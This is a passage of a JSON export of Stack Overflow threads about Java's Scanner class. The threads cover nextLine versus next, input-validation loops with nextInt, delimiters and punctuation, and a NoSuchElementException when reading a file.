Lawrey"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1317578891,"creation_date":1317578891,"answer_id":7628233,"question_id":7628183,"body_markdown":"It may be simpler to use split for what you want.\r\n\r\n    // read a line, split into words and add them to a collection.\r\n    words.addAll(Arrays.asList(input.nextLine().split(&quot;\\\\s+&quot;)));","title":"Java Scanner, taking user input from console into array list as separate words","body":"<p>It may be simpler to use split for what you want.</p>\n\n<pre><code>// read a line, split into words and add them to a collection.\nwords.addAll(Arrays.asList(input.nextLine().split(\"\\\\s+\")));\n</code></pre>\n"},{"tags":[],"owner":{"account_id":949148,"reputation":6284,"user_id":975700,"display_name":"Francisco Paulo"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1317582743,"creation_date":1317582743,"answer_id":7628602,"question_id":7628183,"body_markdown":"You could always use the Console class, like this:\r\n\r\n    Console console = System.console();\r\n\r\n    System.out.print(&quot;Enter a sentence: &quot;);\r\n\r\n    List&lt;String&gt; words = Arrays.asList(console.readLine().split(&quot;\\\\s+&quot;));\r\n\r\n    System.out.println(words);\r\n\r\nThe readline() method should take care of the \\n issue.\r\n\r\nIf you require a Scanner for the type reading capabilities, you can mix both classes:\r\n\r\n    Scanner scanner = new Scanner(console.reader());\r\n\r\nHope this helps!","title":"Java Scanner, taking user input from console into array list as separate words","body":"<p>You could always use the Console class, like this:</p>\n\n<pre><code>Console console = System.console();\n\nSystem.out.print(\"Enter a sentence: \");\n\nList&lt;String&gt; words = Arrays.asList(console.readLine().split(\"\\\\s+\"));\n\nSystem.out.println(words);\n</code></pre>\n\n<p>The readline() method should take care of the \\n issue.</p>\n\n<p>If you require a Scanner for the type reading capabilities, you can mix both classes:</p>\n\n<pre><code>Scanner scanner = new Scanner(console.reader());\n</code></pre>\n\n<p>Hope this helps!</p>\n"}],"owner":{"account_id":446233,"reputation":1122,"user_id":2908666,"accept_rate":80,"display_name":"sjking"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":9671,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":7628233,"answer_count":3,"score":0,"last_activity_date":1683709594,"creation_date":1317578299,"question_id":7628183,"body_markdown":"I am trying to read the user input from the console directly into an array list, separated by each word or entity that has whitespace on either side (the default behavior). The problem is I am stuck inside of a while loop. Scanner.next() keeps waiting for more input, though I know I want to stop feeding input after the user presses return:\r\n\r\n    Scanner input = new Scanner(System.in);\r\n\t\t\r\n\t\tSystem.out.print(&quot;Enter a sentence: &quot;);\r\n\t\tdo {\r\n\t\t\tif (words.add(input.next());\r\n\t\t\t\r\n\t\t} while (input.hasNext());\r\n\t\r\n\t\tSystem.out.println(words);\r\n\r\nI input a line, except I will have to press CTRL-D to terminate it (IE. signal the end of input). I just want to automatically end it when the return &#39;\\n&#39; character is pressed at the end of the sentence.\r\n\r\n","title":"Java Scanner, taking user input from console into array list as separate words","body":"<p>I am trying to read the user input from the console directly into an array list, separated by each word or entity that has whitespace on either side (the default behavior). The problem is I am stuck inside of a while loop. Scanner.next() keeps waiting for more input, though I know I want to stop feeding input after the user presses return:</p>\n\n<pre><code>Scanner input = new Scanner(System.in);\n\n    System.out.print(\"Enter a sentence: \");\n    do {\n        if (words.add(input.next());\n\n    } while (input.hasNext());\n\n    System.out.println(words);\n</code></pre>\n\n<p>I input a line, except I will have to press CTRL-D to terminate it (IE. signal the end of input). I just want to automatically end it when the return '\\n' character is pressed at the end of the sentence.</p>\n"},{"tags":["java","loops","java.util.scanner"],"answers":[{"tags":[],"owner":{"account_id":126997,"reputation":4184,"user_id":323871,"accept_rate":48,"display_name":"Sudhanshu Umalkar"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1363757938,"creation_date":1363757604,"answer_id":15516071,"question_id":15516036,"body_markdown":"Try putting this at the end of the loop - \r\n\r\n    scan.nextLine();\r\n\r\nOr better to put it in the catch block.\r\n\r\n        while (!capacityCheck) {\r\n            try {\r\n                System.out.println(&quot;Capacity&quot;);\r\n                capacity = scan.nextInt();\r\n                capacityCheck = true;\r\n            } catch (InputMismatchException e) {\r\n                System.out.println(&quot;Capacity must be an integer&quot;);\r\n                scan.nextLine();\r\n            }\r\n        }","title":"Scanner keeps skipping input whist using nextInt() and loops","body":"<p>Try putting this at the end of the loop - </p>\n\n<pre><code>scan.nextLine();\n</code></pre>\n\n<p>Or better to put it in the catch block.</p>\n\n<pre><code>    while (!capacityCheck) {\n        try {\n            System.out.println(\"Capacity\");\n            capacity = scan.nextInt();\n            capacityCheck = true;\n        } catch (InputMismatchException e) {\n            System.out.println(\"Capacity must be an integer\");\n            scan.nextLine();\n        }\n    }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2305374,"reputation":44549,"user_id":2024761,"display_name":"Rahul"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1363758882,"creation_date":1363757724,"answer_id":15516104,"question_id":15516036,"body_markdown":"    scan.nextLine();\r\n\r\nPut this piece of code inside your `catch` block, to consume the non integer character along with the new line character which is stays in the buffer(hence, infinitely printing the catch sysout), in the case where you&#39;ve given a wrong input.\r\n\r\nOfcourse, there are other cleaner ways to achieve what you want, but I guess that will require some refactoring in your code.","title":"Scanner keeps skipping input whist using nextInt() and loops","body":"<pre><code>scan.nextLine();\n</code></pre>\n\n<p>Put this piece of code inside your <code>catch</code> block, to consume the non integer character along with the new line character which is stays in the buffer(hence, infinitely printing the catch sysout), in the case where you've given a wrong input.</p>\n\n<p>Ofcourse, there are other cleaner ways to achieve what you want, but I guess that will require some refactoring in your code.</p>\n"},{"tags":[],"owner":{"account_id":1816200,"reputation":18958,"user_id":1651233,"accept_rate":67,"display_name":"BobTheBuilder"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1363757724,"creation_date":1363757724,"answer_id":15516105,"question_id":15516036,"body_markdown":"Use the following:\r\n\r\n    while (!capacityCheck) {\r\n            System.out.println(&quot;Capacity&quot;);\r\n            String input = scan.nextLine();\r\n            try {\r\n                capacity = Integer.parseInt(input );\r\n                capacityCheck = true;\r\n            } catch (NumberFormatException e) {\r\n                System.out.println(&quot;Capacity must be an integer&quot;);\r\n            }\r\n        }\r\n","title":"Scanner keeps skipping input whist using nextInt() and loops","body":"<p>Use the following:</p>\n\n<pre><code>while (!capacityCheck) {\n        System.out.println(\"Capacity\");\n        String input = scan.nextLine();\n        try {\n            capacity = Integer.parseInt(input );\n            capacityCheck = true;\n        } catch (NumberFormatException e) {\n            System.out.println(\"Capacity must be an integer\");\n        }\n    }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2496071,"reputation":927,"user_id":2172423,"accept_rate":30,"display_name":"Kim Honoridez"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1363757794,"creation_date":1363757794,"answer_id":15516114,"question_id":15516036,"body_markdown":"Try this :\r\n\r\n    while (!capacityCheck) {\r\n        try {\r\n            System.out.println(&quot;Capacity&quot;);\r\n            capacity = scan.nextInt();\r\n            capacityCheck = true;\r\n        } catch (InputMismatchException e) {\r\n            System.out.println(&quot;Capacity must be an integer&quot;);\r\n            scan.nextLine();\r\n        }\r\n    }","title":"Scanner keeps skipping input whist using nextInt() and loops","body":"<p>Try this :</p>\n\n<pre><code>while (!capacityCheck) {\n    try {\n        System.out.println(\"Capacity\");\n        capacity = scan.nextInt();\n        capacityCheck = true;\n    } catch (InputMismatchException e) {\n        System.out.println(\"Capacity must be an integer\");\n        scan.nextLine();\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1867908,"reputation":4350,"user_id":1690982,"display_name":"ddmps"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1363758002,"creation_date":1363758002,"answer_id":15516152,"question_id":15516036,"body_markdown":"I see no need for a try/catch or `capacityCheck` as we have access to the method `hasNextInt()` - which checks if the next token is an int. For instance this should do what you want:\r\n\r\n\t\twhile (!scan.hasNextInt()) { //as long as the next is not a int - say you need to input an int and move forward to the next token.\r\n\t\t\tSystem.out.println(&quot;Capacity must be an integer&quot;);\r\n\t\t\tscan.next();\r\n\t\t}\r\n\t\tcapacity = scan.nextInt(); //scan.hasNextInt() returned true in the while-clause so this will be valid.\r\n\r\n","title":"Scanner keeps skipping input whist using nextInt() and loops","body":"<p>I see no need for a try/catch or <code>capacityCheck</code> as we have access to the method <code>hasNextInt()</code> - which checks if the next token is an int. For instance this should do what you want:</p>\n\n<pre><code>    while (!scan.hasNextInt()) { //as long as the next is not a int - say you need to input an int and move forward to the next token.\n        System.out.println(\"Capacity must be an integer\");\n        scan.next();\n    }\n    capacity = scan.nextInt(); //scan.hasNextInt() returned true in the while-clause so this will be valid.\n</code></pre>\n"}],"owner":{"account_id":231097,"reputation":1471,"user_id":495123,"accept_rate":62,"display_name":"Matt"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":2532,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":5,"score":1,"last_activity_date":1683709569,"creation_date":1363757426,"question_id":15516036,"body_markdown":"I am using a while loop to make sure that the value entered to a scanner object is an integer as such:\r\n\r\n    while (!capacityCheck) {\r\n            try {\r\n                System.out.println(&quot;Capacity&quot;);\r\n                capacity = scan.nextInt();\r\n                capacityCheck = true;\r\n            } catch (InputMismatchException e) {\r\n                System.out.println(&quot;Capacity must be an integer&quot;);\r\n            }\r\n        }\r\n\r\nhowever, if the user does not enter an integer, when it should go back and take another input it just repeatedly prints  &quot;Capacity&quot; followed by the output in the catch without asking for more input. How do I stop this?","title":"Scanner keeps skipping input whist using nextInt() and loops","body":"<p>I am using a while loop to make sure that the value entered to a scanner object is an integer as such:</p>\n\n<pre><code>while (!capacityCheck) {\n        try {\n            System.out.println(\"Capacity\");\n            capacity = scan.nextInt();\n            capacityCheck = true;\n        } catch (InputMismatchException e) {\n            System.out.println(\"Capacity must be an integer\");\n        }\n    }\n</code></pre>\n\n<p>however, if the user does not enter an integer, when it should go back and take another input it just repeatedly prints  \"Capacity\" followed by the output in the catch without asking for more input. How do I stop this?</p>\n"},{"tags":["java","java.util.scanner"],"comments":[{"owner":{"account_id":260780,"reputation":16208,"user_id":544557,"display_name":"Jim Balter"},"score":0,"creation_date":1386365897,"post_id":20433986,"comment_id":30524267,"body_markdown":"gen.charAt(0) doesn&#39;t have anything to do with what NextLine does to advance -- it accesses the first (0th) char in gen, which is a representation of the line already read.","body":"gen.charAt(0) doesn&#39;t have anything to do with what NextLine does to advance -- it accesses the first (0th) char in gen, which is a representation of the line already read."}],"answers":[{"tags":[],"owner":{"account_id":4077914,"reputation":108,"user_id":3349075,"display_name":"FlutterDashie"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1393447157,"creation_date":1393445859,"answer_id":22052323,"question_id":20433986,"body_markdown":"As Jim said in the comment, `charAt(0)` is unrelated to `next()` vs. `nextLine()`.\r\n`charAt(0)` is reading from the `String` *read from* the `Scanner`, not reading directly from the `Scanner` itself.\r\n\r\nErgo, where the pointer is makes no difference (to the best of my knowledge) to what is being read by `charAt(0)`. Hopefully that clears it up a bit.","title":".nextLine() versus .next()?","body":"<p>As Jim said in the comment, <code>charAt(0)</code> is unrelated to <code>next()</code> vs. <code>nextLine()</code>.\n<code>charAt(0)</code> is reading from the <code>String</code> <em>read from</em> the <code>Scanner</code>, not reading directly from the <code>Scanner</code> itself.</p>\n\n<p>Ergo, where the pointer is makes no difference (to the best of my knowledge) to what is being read by <code>charAt(0)</code>. Hopefully that clears it up a bit.</p>\n"}],"owner":{"account_id":3368348,"reputation":83,"user_id":2828292,"accept_rate":43,"display_name":"NaC114"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":151,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"answer_count":1,"score":-1,"last_activity_date":1683709549,"creation_date":1386365707,"question_id":20433986,"body_markdown":"and thank you for your time,\r\n\r\nI&#39;ve been coding for a month now, and a couple of times I have an issue regarding `nextLine`:\r\n\r\n            gen = sc.nextLine();\r\n            ge = gen.charAt(0);\r\n\r\nIn this case there is an issue because from what I read &quot;The `nextLine()` method scans everything on the current line and then advances the pointer past that line. So when you call the `charAt()` method, you are calling it on the next line, which is blank space, and thus an error is occuring.&quot;\r\n\r\nMy question is, if `nextLine` may cause this kind of problem, what is the point of using it at all? I could simply put `.next()` for it to work.\r\n\r\n\r\n","title":".nextLine() versus .next()?","body":"<p>and thank you for your time,</p>\n\n<p>I've been coding for a month now, and a couple of times I have an issue regarding <code>nextLine</code>:</p>\n\n<pre><code>        gen = sc.nextLine();\n        ge = gen.charAt(0);\n</code></pre>\n\n<p>In this case there is an issue because from what I read \"The <code>nextLine()</code> method scans everything on the current line and then advances the pointer past that line. So when you call the <code>charAt()</code> method, you are calling it on the next line, which is blank space, and thus an error is occuring.\"</p>\n\n<p>My question is, if <code>nextLine</code> may cause this kind of problem, what is the point of using it at all? I could simply put <code>.next()</code> for it to work.</p>\n"},{"tags":["java","switch-statement","java.util.scanner"],"answers":[{"tags":[],"owner":{"account_id":234661,"reputation":9325,"user_id":500959,"accept_rate":84,"display_name":"austinbv"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1290807115,"creation_date":1290807115,"answer_id":4288655,"question_id":4288630,"body_markdown":"You either have to strip the newline character `\\n` from the user input or assume it&#39;s there in your switch statement.\r\n\r\nPretty much because you decided to use nextLine() the user input to the computer will look like this\r\n\r\n     f\\n\r\n\r\nSo just compare the strings accordingly!","title":"Java - nextLine(); within a switch statement","body":"<p>You either have to strip the newline character <code>\\n</code> from the user input or assume it's there in your switch statement.</p>\n\n<p>Pretty much because you decided to use nextLine() the user input to the computer will look like this</p>\n\n<pre><code> f\\n\n</code></pre>\n\n<p>So just compare the strings accordingly!</p>\n"},{"tags":[],"owner":{"account_id":220789,"reputation":114430,"user_id":478399,"accept_rate":83,"display_name":"AlexR"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1291371711,"creation_date":1290807270,"answer_id":4288669,"question_id":4288630,"body_markdown":"Switch selector can be only integer, short, char or enum. String cannot be used as a switch selector. \r\n\r\nIf I understood you correctly you would like to control your flow using words entered by user. If you have predefined list of words I&#39;d suggest you to use enum:\r\n\r\nenum Words {\r\n    start, stop, beep,\r\n}\r\n\r\nNow user enters a word beep. You can say:\r\n\r\n    Words command = Words.valueOf();\r\n    ///\r\n    switch (command) {\r\n        case start: /* start something */ break;\r\n        case stop: /* stop something */ break;\r\n        case beep: /* beep!!! */ break;\r\n        default: throw new IllegalArgumentException(&quot;Unknown command &quot; + command);\r\n    }","title":"Java - nextLine(); within a switch statement","body":"<p>Switch selector can be only integer, short, char or enum. String cannot be used as a switch selector. </p>\n\n<p>If I understood you correctly you would like to control your flow using words entered by user. If you have predefined list of words I'd suggest you to use enum:</p>\n\n<p>enum Words {\n    start, stop, beep,\n}</p>\n\n<p>Now user enters a word beep. You can say:</p>\n\n<pre><code>Words command = Words.valueOf();\n///\nswitch (command) {\n    case start: /* start something */ break;\n    case stop: /* stop something */ break;\n    case beep: /* beep!!! */ break;\n    default: throw new IllegalArgumentException(\"Unknown command \" + command);\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":675789,"reputation":51,"user_id":521804,"display_name":"Ben Smith"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1290812791,"creation_date":1290808313,"answer_id":4288743,"question_id":4288630,"body_markdown":"OK I think I am too inept at Java and have put my question badly.\r\n\r\nWhen I take the users input it takes only 1 word, I want it to take everything they put basically, and when I use nextLine, this just skips the reading and takes me back to selecting a choice.","title":"Java - nextLine(); within a switch statement","body":"<p>OK I think I am too inept at Java and have put my question badly.</p>\n\n<p>When I take the users input it takes only 1 word, I want it to take everything they put basically, and when I use nextLine, this just skips the reading and takes me back to selecting a choice.</p>\n"},{"tags":[],"owner":{"account_id":20130,"reputation":279845,"user_id":47773,"accept_rate":52,"display_name":"Matthew Flaschen"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1290812363,"creation_date":1290809267,"answer_id":4288848,"question_id":4288630,"body_markdown":"Just use:\r\n\r\n    name=in.nextLine();\r\n\r\nand\r\n\r\n    String choice = in.nextLine();\r\n\r\nThis should be in the constructor, and at the top of runApp.\r\n\r\nThat way, you&#39;re not leaving the new line in the buffer (where it will be used for e.g. `dp`).\r\n\r\nYou should have:\r\n\r\n    dp=in.nextLine();\r\n\r\nas described in your question.\r\n\r\n","title":"Java - nextLine(); within a switch statement","body":"<p>Just use:</p>\n\n<pre><code>name=in.nextLine();\n</code></pre>\n\n<p>and</p>\n\n<pre><code>String choice = in.nextLine();\n</code></pre>\n\n<p>This should be in the constructor, and at the top of runApp.</p>\n\n<p>That way, you're not leaving the new line in the buffer (where it will be used for e.g. <code>dp</code>).</p>\n\n<p>You should have:</p>\n\n<pre><code>dp=in.nextLine();\n</code></pre>\n\n<p>as described in your question.</p>\n"}],"owner":{"account_id":675789,"reputation":51,"user_id":521804,"display_name":"Ben Smith"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":3111,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":4288848,"answer_count":4,"score":0,"last_activity_date":1683709529,"creation_date":1290806792,"question_id":4288630,"body_markdown":"I have a switch statement acting as a menu, in this I am trying to read the users input. Currently I am using `variable=in.next();` and this works. However it will only read one word and at points the user may need to enter more, so I tried using `variable=in.nextLine();`, which compiles, but when I run the program, I select my choice from the menu, and it skips the reading in and return to the menu.\r\n\r\nAny help would be appreciated, thanks :)\r\n","title":"Java - nextLine(); within a switch statement","body":"<p>I have a switch statement acting as a menu, in this I am trying to read the users input. Currently I am using <code>variable=in.next();</code> and this works. However it will only read one word and at points the user may need to enter more, so I tried using <code>variable=in.nextLine();</code>, which compiles, but when I run the program, I select my choice from the menu, and it skips the reading in and return to the menu.</p>\n\n<p>Any help would be appreciated, thanks :)</p>\n"},{"tags":["java","file","java.util.scanner","punctuation"],"comments":[{"owner":{"account_id":71739,"reputation":307142,"user_id":207421,"accept_rate":82,"display_name":"user207421"},"score":0,"creation_date":1303690473,"post_id":5772946,"comment_id":6615678,"body_markdown":"Scanner doesn&#39;t *have* punctuation. It has delimiters though.","body":"Scanner doesn&#39;t <i>have</i> punctuation. It has delimiters though."}],"answers":[{"tags":[],"owner":{"account_id":13508,"reputation":30347,"user_id":27198,"accept_rate":72,"display_name":"Itay Maman"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1303676485,"creation_date":1303676485,"answer_id":5773015,"question_id":5772946,"body_markdown":"Scanner has a `useDelimiter` method which lets you specify which characters will be considered as &#39;word breakers&#39;. The default delimiter is the whitespace pattern (so punctuations symbols will be included in the word)","title":"Punctuation and the .next() method","body":"<p>Scanner has a <code>useDelimiter</code> method which lets you specify which characters will be considered as 'word breakers'. The default delimiter is the whitespace pattern (so punctuations symbols will be included in the word)</p>\n"},{"tags":[],"owner":{"account_id":329612,"reputation":71055,"user_id":653230,"display_name":"WhiteFang34"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1303676512,"creation_date":1303676512,"answer_id":5773018,"question_id":5772946,"body_markdown":"The default delimiter for `Scanner` is whitespaces. So none of the examples you provided will be split. Why not try it yourself though?\r\n\r\n\tString input = &quot;That&#39;s a they are, her. They&#39;re here.&quot;;\r\n\tScanner scanner = new Scanner(input);\r\n\twhile (scanner.hasNext()) {\r\n\t\tSystem.out.println(scanner.next());\r\n\t}\r\n\r\nIf you did happen to want to split on something like `&#39;` and whitespaces you would use something like:\r\n\r\n\tScanner scanner = new Scanner(input).useDelimiter(&quot;[\\\\s&#39;]&quot;);","title":"Punctuation and the .next() method","body":"<p>The default delimiter for <code>Scanner</code> is whitespaces. So none of the examples you provided will be split. Why not try it yourself though?</p>\n\n<pre><code>String input = \"That's a they are, her. They're here.\";\nScanner scanner = new Scanner(input);\nwhile (scanner.hasNext()) {\n    System.out.println(scanner.next());\n}\n</code></pre>\n\n<p>If you did happen to want to split on something like <code>'</code> and whitespaces you would use something like:</p>\n\n<pre><code>Scanner scanner = new Scanner(input).useDelimiter(\"[\\\\s']\");\n</code></pre>\n"},{"tags":[],"owner":{"account_id":97818,"reputation":114824,"user_id":265143,"accept_rate":72,"display_name":"P&#233;ter T&#246;r&#246;k"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1303676566,"creation_date":1303676566,"answer_id":5773020,"question_id":5772946,"body_markdown":"I didn&#39;t know (only guessed), so I&#39;ve tried it myself:\r\n\r\n        String input = &quot;That&#39;s what they are, I told her. She said, it ain&#39;t so!&quot;;\r\n        Scanner s = new Scanner(input); // default delimiter is whitespaces\r\n        \r\n        while (s.hasNext()) {\r\n            System.out.println(s.next());\r\n        }\r\n\r\nOutput:\r\n\r\n    That&#39;s\r\n    what\r\n    they\r\n    are,\r\n    I\r\n    told\r\n    her.\r\n    She\r\n    said,\r\n    it\r\n    ain&#39;t\r\n    so!\r\n\r\n","title":"Punctuation and the .next() method","body":"<p>I didn't know (only guessed), so I've tried it myself:</p>\n\n<pre><code>    String input = \"That's what they are, I told her. She said, it ain't so!\";\n    Scanner s = new Scanner(input); // default delimiter is whitespaces\n\n    while (s.hasNext()) {\n        System.out.println(s.next());\n    }\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>That's\nwhat\nthey\nare,\nI\ntold\nher.\nShe\nsaid,\nit\nain't\nso!\n</code></pre>\n"}],"owner":{"account_id":277663,"reputation":10486,"user_id":571783,"accept_rate":100,"display_name":"Aaron"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":8476,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":5773015,"answer_count":3,"score":0,"last_activity_date":1683709513,"creation_date":1303675771,"question_id":5772946,"body_markdown":"Does anyone know how the Scanner&#39;s .next() method treats punctuation? I couldn&#39;t find the answer to this anywhere. I have a program that&#39;s reading each word in from a text file and I am unsure of how it treats parts like &quot;that&#39;s&quot; or &quot;they are,&quot; or &quot;her.&quot;\r\n\r\nFor periods and commas, are they counted as a separate entity or are they considered part of the word if it occurs like &quot;her.&quot; or &quot;her,&quot;? Depending on what it does, are &quot;her&quot; and &quot;her.&quot; or &quot;her&quot; and &quot;her,&quot; considered two different words by the Scanner?\r\n\r\nFor apostrophes, do they get accounted for or do they effectively split the word in two? For example, would &quot;they&#39;re&quot; be recognized as &quot;they&quot; &quot;&#39;&quot; &quot;re&quot; or would it be recognized as &quot;they&#39;re&quot; altogether?\r\n\r\nI hope I came across clearly on this question.","title":"Punctuation and the .next() method","body":"<p>Does anyone know how the Scanner's .next() method treats punctuation? I couldn't find the answer to this anywhere. I have a program that's reading each word in from a text file and I am unsure of how it treats parts like \"that's\" or \"they are,\" or \"her.\"</p>\n\n<p>For periods and commas, are they counted as a separate entity or are they considered part of the word if it occurs like \"her.\" or \"her,\"? Depending on what it does, are \"her\" and \"her.\" or \"her\" and \"her,\" considered two different words by the Scanner?</p>\n\n<p>For apostrophes, do they get accounted for or do they effectively split the word in two? For example, would \"they're\" be recognized as \"they\" \"'\" \"re\" or would it be recognized as \"they're\" altogether?</p>\n\n<p>I hope I came across clearly on this question.</p>\n"},{"tags":["java","java.util.scanner","nosuchelementexception"],"comments":[{"owner":{"account_id":1085259,"reputation":78314,"user_id":1081110,"display_name":"Dawood ibn Kareem"},"score":0,"creation_date":1395983124,"post_id":22704580,"comment_id":34596206,"body_markdown":"It looks like you&#39;re trying to put the whole file into a String.  This is dealt with at [What is simplest way to read a file into String?](http://stackoverflow.com/questions/3402735/what-is-simplest-way-to-read-a-file-into-string) which is why I voted to close as a duplicate of that one.  It&#39;s not that this is a bad question - it&#39;s a good one.  It&#39;s just that this has been done before.","body":"It looks like you&#39;re trying to put the whole file into a String.  This is dealt with at <a href=\"http://stackoverflow.com/questions/3402735/what-is-simplest-way-to-read-a-file-into-string\">What is simplest way to read a file into String?</a> which is why I voted to close as a duplicate of that one.  It&#39;s not that this is a bad question - it&#39;s a good one.  It&#39;s just that this has been done before."}],"answers":[{"tags":[],"owner":{"account_id":968830,"reputation":17562,"user_id":991778,"accept_rate":78,"display_name":"sanbhat"},"down_vote_count":0,"up_vote_count":5,"is_accepted":true,"score":5,"last_activity_date":1395983024,"creation_date":1395983024,"answer_id":22704602,"question_id":22704580,"body_markdown":"You should check `hasNext()` before calling `next()`. Probably there are no elements matching your criteria.\r\n\r\n\r\n    Scanner s = new Scanner(file);\r\n    s.useDelimiter(&quot;\\\\Z&quot;);\r\n    if(s.hasNext()) {\r\n       contents = s.next().toCharArray();\r\n    }","title":"exception in thread main java.util.nosuchelementexception with new Scanner(file)","body":"<p>You should check <code>hasNext()</code> before calling <code>next()</code>. Probably there are no elements matching your criteria.</p>\n\n<pre><code>Scanner s = new Scanner(file);\ns.useDelimiter(\"\\\\Z\");\nif(s.hasNext()) {\n   contents = s.next().toCharArray();\n}\n</code></pre>\n"}],"owner":{"account_id":1446318,"reputation":451,"user_id":1364658,"accept_rate":87,"display_name":"Lina"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1248,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"accepted_answer_id":22704602,"answer_count":1,"score":2,"last_activity_date":1683709498,"creation_date":1395982905,"question_id":22704580,"body_markdown":"I have a problem with my code,I get this error all the time:\r\n\r\n    Exception in thread &quot;main&quot; java.util.NoSuchElementException\r\n    \tat java.util.Scanner.throwFor(Scanner.java:907)\r\n    \tat java.util.Scanner.next(Scanner.java:1416)\r\n    \tat audio.AudioSecrets.main(AudioSecrets.java:32)\r\n    Java Result: 1\r\n\r\nmy problem is this ligne:\r\n    \r\n\r\n    contents = new Scanner(file).useDelimiter(&quot;\\\\Z&quot;).next().toCharArray(); // \r\n\r\nThe `\\\\Z` delimiter in combination with `.next()` will read input until there isn&#39;t any left.\r\n\r\n\r\nhow can I input the file to my program,thanks for help \r\n","title":"exception in thread main java.util.nosuchelementexception with new Scanner(file)","body":"<p>I have a problem with my code,I get this error all the time:</p>\n\n<pre><code>Exception in thread \"main\" java.util.NoSuchElementException\n    at java.util.Scanner.throwFor(Scanner.java:907)\n    at java.util.Scanner.next(Scanner.java:1416)\n    at audio.AudioSecrets.main(AudioSecrets.java:32)\nJava Result: 1\n</code></pre>\n\n<p>my problem is this ligne:</p>\n\n<pre><code>contents = new Scanner(file).useDelimiter(\"\\\\Z\").next().toCharArray(); // \n</code></pre>\n\n<p>The <code>\\\\Z</code> delimiter in combination with <code>.next()</code> will read input until there isn't any left.</p>\n\n<p>how can I input the file to my program,thanks for help </p>\n"},{"tags":["java","java.util.scanner"],"answers":[{"tags":[],"owner":{"account_id":20026,"reputation":80588,"user_id":47453,"accept_rate":88,"display_name":"Bill Lynch"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1406479699,"creation_date":1406479699,"answer_id":24983170,"question_id":24983136,"body_markdown":"Note that [`Scanner.nextLine()`](http://docs.oracle.com/javase/7/docs/api/java/util/Scanner.html#nextLine()) consumes data from the scanner. So in this example:\r\n\r\n    if(scan.nextLine().toString() == &quot;Male&quot;)\r\n    {\r\n        male = new JRadioButton(&quot;Male&quot;, true);\r\n    }\r\n    else if(scan.nextLine().toString() == &quot;Female&quot;)\r\n    {\r\n        female = new JRadioButton(&quot;Female&quot;, true);\r\n    }\r\n\r\non the first if statement, you&#39;ll consume data from the scanner, and if the conditional is false, you&#39;ll then consume whatever follows it within the else-if statement.\r\n\r\nYou probably just want to do `String input = scan.nextLine();` and then compare against that stored string.","title":"Scanner hasNext() doesn&#39;t match correctly inside if statements","body":"<p>Note that <a href=\"http://docs.oracle.com/javase/7/docs/api/java/util/Scanner.html#nextLine()\" rel=\"nofollow\"><code>Scanner.nextLine()</code></a> consumes data from the scanner. So in this example:</p>\n\n<pre><code>if(scan.nextLine().toString() == \"Male\")\n{\n    male = new JRadioButton(\"Male\", true);\n}\nelse if(scan.nextLine().toString() == \"Female\")\n{\n    female = new JRadioButton(\"Female\", true);\n}\n</code></pre>\n\n<p>on the first if statement, you'll consume data from the scanner, and if the conditional is false, you'll then consume whatever follows it within the else-if statement.</p>\n\n<p>You probably just want to do <code>String input = scan.nextLine();</code> and then compare against that stored string.</p>\n"}],"owner":{"account_id":4629530,"reputation":943,"user_id":3752432,"accept_rate":81,"display_name":"Axion004"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":721,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":24983170,"answer_count":1,"score":0,"last_activity_date":1683709454,"creation_date":1406479462,"question_id":24983136,"body_markdown":"I have created the following code through making a while loop. I cannot tell why the loop is set to look at 17 lines and not 15 lines.\r\n\r\n    while (scan.hasNext())\r\n    \t\t\t\t{\t\t\t\r\n    \t\t\t\t\tselectedUserName.setText(scan.next());\r\n    \t\t\t\t\tif(scan.nextLine().toString() == &quot;Male&quot;)\r\n    \t\t\t\t\t{\r\n    \t\t\t\t\t\tmale = new JRadioButton(&quot;Male&quot;, true);\r\n    \t\t\t\t\t}\r\n    \t\t\t\t\telse if(scan.nextLine().toString() == &quot;Female&quot;)\r\n    \t\t\t\t\t{\r\n    